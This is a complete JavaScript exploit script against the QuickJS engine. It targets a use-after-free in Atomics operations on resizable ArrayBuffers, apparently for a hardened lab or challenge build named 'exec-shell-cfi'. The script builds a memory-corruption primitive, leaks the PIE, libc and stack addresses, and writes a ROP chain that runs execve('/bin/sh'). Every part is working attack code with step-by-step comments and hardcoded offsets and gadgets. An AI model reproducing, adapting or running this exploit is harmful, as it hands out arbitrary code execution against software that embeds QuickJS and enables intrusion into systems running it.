// QuickJS Atomics Resizable ArrayBuffer UAF Exploit
// Target: exec-shell-cfi (Full RELRO + CFI)
//
// Exploits CVE in Atomics operations where a stale pointer is used after
// the underlying buffer is resized via valueOf callback.

import * as std from 'std';

// Binary offsets (CFI build)
const JS_ARRAY_BUFFER_FREE_OFF = 0x107df0n;
const FREE_GOT_OFF = 0x111768n;

// Libc offsets
const LIBC_FREE_OFF = 0xa3240n;
const LIBC_ENVIRON_OFF = 0x1eee28n;

// ROP gadgets (libc)
const POP_RDI = 0x2a145n;
const POP_RSI = 0x2baa9n;
const POP_RDX_RBX = 0x8f0c5n;
const POP_RAX = 0x43c23n;
const SYSCALL = 0x28505n;
const BINSH_OFF = 0x1a7ea4n;

// UAF primitive with configurable victim size
function uaf(offset8, value, victimSize = 64) {
    let ab = new ArrayBuffer(56, { maxByteLength: 65536 });
    let view = new BigUint64Array(ab);
    let victim = null;
    let trigger = { valueOf: () => {
        if (!victim) {
            ab.resize(32768);
            victim = new ArrayBuffer(victimSize);
        }
        return value;
    }};
    let old = Atomics.exchange(view, offset8, trigger);
    return { old: old, victim: victim };
}

// Step 1: Leak PIE base via free_func pointer
let r1 = uaf(6, 0n);  // Read offset 48 (free_func), write 0 (safe for GC)
let pie = r1.old - JS_ARRAY_BUFFER_FREE_OFF;

// Step 2: Leak libc via GOT[free]
let r2 = uaf(2, pie + FREE_GOT_OFF);
let libc = new BigUint64Array(r2.victim)[0] - LIBC_FREE_OFF;

// Step 3: Leak stack address via libc environ
let r3 = uaf(2, libc + LIBC_ENVIRON_OFF);
let environ = new BigUint64Array(r3.victim)[0];

// Calculate gadget addresses
let pop_rdi = libc + POP_RDI;
let pop_rsi = libc + POP_RSI;
let pop_rdx_rbx = libc + POP_RDX_RBX;
let pop_rax = libc + POP_RAX;
let syscall_addr = libc + SYSCALL;
let binsh = libc + BINSH_OFF;

// Step 4: Write ROP chain to stack
// Target a return address that will be used during cleanup
let stack_target = environ - 1256n;

let r4 = uaf(2, stack_target, 128);  // Larger victim for ROP chain
let v4 = new BigUint64Array(r4.victim);

// ROP chain for execve("/bin/sh", NULL, NULL)
// execve syscall number = 59 (0x3b)
v4[0] = pop_rdi;
v4[1] = binsh;
v4[2] = pop_rsi;
v4[3] = 0n;
v4[4] = pop_rdx_rbx;
v4[5] = 0n;
v4[6] = 0n;
v4[7] = pop_rax;
v4[8] = 59n;
v4[9] = syscall_addr;
